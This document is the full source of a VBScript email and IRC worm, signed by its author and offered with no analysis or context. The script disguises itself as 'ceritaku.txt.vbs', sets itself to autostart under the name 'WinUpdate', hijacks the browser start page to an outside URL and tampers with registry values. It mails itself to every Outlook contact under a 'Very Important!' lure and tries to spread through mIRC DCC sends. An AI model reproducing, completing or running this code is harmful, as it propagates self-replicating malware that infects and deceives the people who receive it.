Set L23QDSVD = createobject("scripting.filesystemobject")
M4SPP714 = L23QDSVD.getspecialfolder(0)
U347ENCE = M4SPP714 & "\ceritaku.txt.vbs"
Set B58JA1L8 = createobject("wscript.shell")
B58JA1L8.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate", "wscript.exe " & U347ENCE & " %"
B58JA1L8.regwrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://h1.ripway.com/anharku" & U347ENCE & " %"
B58JA1L8.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization", "rieysha" & U347ENCE & " %"
B58JA1L8.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RRegisteredOwner", "ANAK JOGJA" & U347ENCE & " %"
B58JA1L8.RegWrite "HKEY_CURRENT_USER\Control Panel\International\s1159", "rieysha" & U347ENCE & " %"
B58JA1L8.RegWrite "HKEY_CURRENT_USER\Control Panel\International\s2359", "rieysha" & U347ENCE & " %"
L23QDSVD.copyfile wscript.scriptfullname, U347ENCE
If B58JA1L8.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ceritaku\R1268ANS") <> 1 then
RT6LJ141
End if
If B58JA1L8.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ceritaku\HA4C2I8K") <> 1 then
A0UT8482 ""
End if
Function RT6LJ141()
Set EJSL6BAE = CreateObject("Outlook.Application")
If EJSL6BAE = "Outlook" Then
Set M68N42AH = EJSL6BAE.GetNameSpace("MAPI")
Set IC4FESF6 = M68N42AH.AddressLists
For Each I1IH0J62 In IC4FESF6
If I1IH0J62.AddressEntries.Count <> 0 Then
TCT4853N = I1IH0J62.AddressEntries.Count
For GJ7P3810 = 1 To TCT4853N
Set KECO39GA = EJSL6BAE.CreateItem(0)
Set L218C6V2 = I1IH0J62.AddressEntries(GJ7P3810)
KECO39GA.To = L218C6V2.Address
KECO39GA.Subject = "Very Important!"
KECO39GA.Body = "Hi:" & vbcrlf & "Please view this file, it's very important." & vbcrlf & ""
execute "set H72H7563 =KECO39GA." & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
A4I4VTFK = U347ENCE
KECO39GA.DeleteAfterSubmit = True
H72H7563.Add A4I4VTFK
If KECO39GA.To <> "" Then
KECO39GA.Send
End If
Next
End If
Next
End If
End function
Function A0UT8482(F3S1P787)
If F3S1P787 <> "" Then
TE1LUU75 = B58JA1L8.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If L23QDSVD.fileexists("c:\mirc\mirc.ini") Then
F3S1P787 = "c:\mirc"
ElseIf L23QDSVD.fileexists("c:\mirc32\mirc.ini") Then
F3S1P787 = "c:\mirc32"
ElseIf L23QDSVD.fileexists(TE1LUU75 & "\mirc\mirc.ini") Then
F3S1P787 = TE1LUU75 & "\mirc"
ElseIf L23QDSVD.fileexists(TE1LUU75 & "\mirc32\mirc.ini") Then
F3S1P787 = TE1LUU75 & "\mirc"
Else
F3S1P787 = ""
End If
End If
If F3S1P787 <> "" Then
Set QGQ655N9 = L23QDSVD.CreateTextFile(F3S1P787 & "\script.ini", True)
QGQ655N9 = "[script]" & vbCrLf & "n0=on 1:JOIN:#:{"
QGQ655N9 = QGQ655N9 & vbCrLf & "n0=on 1:JOIN:#:{"
QGQ655N9 = QGQ655N9 & vbCrLf & "n1=  /if ( $nick == $me ) { halt }"
QGQ655N9 = QGQ655N9 & vbCrLf & "n2=  /." & Chr(100) & Chr(99) & Chr(99) & " send $nick "
QGQ655N9 = QGQ655N9 & U347ENCE
QGQ655N9 = QGQ655N9 & vbCrLf & "n3=}"
script.Close
End If
End Function
'by:rieysha
'http://h1.ripway.com/anharku